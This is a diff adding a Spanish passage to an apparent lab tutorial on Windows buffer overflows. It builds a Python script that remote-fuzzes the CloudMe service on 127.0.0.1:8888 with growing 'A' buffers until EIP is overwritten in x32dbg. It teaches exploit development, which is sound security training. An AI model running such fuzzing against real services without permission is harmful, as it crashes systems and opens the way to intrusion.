@@ -530,10 +530,62 @@ PS C:\Users\htb-student\Desktop> .\nc.exe 127.0.0.1 8888
 help
 ```
 
+Una vez que nuestro programa se está ejecutando y estamos conectados a él a través de `x32dbg`, podemos comenzar a fuzzearlo e intentar bloquearlo. A diferencia del fuzzing local, donde escribimos nuestras cargas útiles en un archivo y luego abrimos el archivo en nuestra aplicación o copiamos manualmente nuestra carga útil en un campo de texto en el programa, con el fuzzing remoto, podemos automatizar este proceso a través de nuestro exploit de Python.
+
+Crearemos un nuevo script llamado `win32bof_exploit_remote.py` y comenzaremos agregando un par de variables para `IP`y `port`, de modo que podamos cambiarlas fácilmente si queremos usar el script en otro servidor. Luego, escribiremos nuestra función de fuzzing `def fuzz():`. Queremos enviar incrementos de cadenas grandes, comenzando con `500`bytes de longitud e incrementando en `500` en cada iteración, hasta que enviemos una cadena lo suficientemente larga como para hacer que el programa se bloquee. Para lograr esto, haremos un bucle en un rango de `0` a `10,000` con incrementos de `500`, de la siguiente manera:
+
+```python
+import socket
+from struct import pack
+
+IP = "127.0.0.1"
+port = 8888
+
+def fuzz():
+    for i in range(0,10000,500):
+        buffer = b"A"*i
+        print("Fuzzing %s bytes" % i)
+```
+
+La declaración de impresión nos ayuda a conocer el tamaño actual del búfer de fuzzing para que cuando el programa finalmente falle, sepamos qué longitud provocó el fallo.
+
+A continuación, debemos conectarnos al puerto cada vez y enviarle nuestra carga útil. Para ello, tenemos que importar la `socket` biblioteca como hicimos al principio de nuestro código anterior y, a continuación, establecer una conexión al puerto con la `connect` función, de la siguiente manera:
+
+```python
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((IP, port))
+```
+
+Con esto, deberíamos estar listos para enviar nuestro buffer, lo cual podemos hacer a través de `s.send(buffer)`. También necesitaremos envolver nuestro bucle en un `try/except` bloque, de modo que podamos detener la ejecución cuando el programa se bloquee y ya no acepte conexiones. Nuestra `fuzz()`función final debería verse de la siguiente manera:
+
+```python
+def fuzz():
+    try:
+        for i in range(0,10000,500):
+            buffer = b"A"*i
+            print("Fuzzing %s bytes" % i)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((IP, port))
+            s.send(buffer)
+            s.close()
+    except:
+        print("Could not establish a connection")
+
+fuzz()
+```
+
+Ejecutamos nuestro script y vemos lo siguiente:
+
+```cmd-session
+Fuzzing 0 bytes
+Fuzzing 500 bytes
+...SNIP...
+Fuzzing 9000 bytes
+Fuzzing 9500 bytes
+```
 
 
-
-
+Vemos que todo el script se ejecutó sin bloquear los servicios de escucha, ya que el puerto `8888`seguía escuchando durante nuestro análisis de fuzzing. Sin embargo, si verificamos nuestro `x32dbg` depurador, vemos que el `cloudme`programa front-end se bloqueó y `EIP`se sobrescribió con nuestro `A`búfer de :
 
 
 
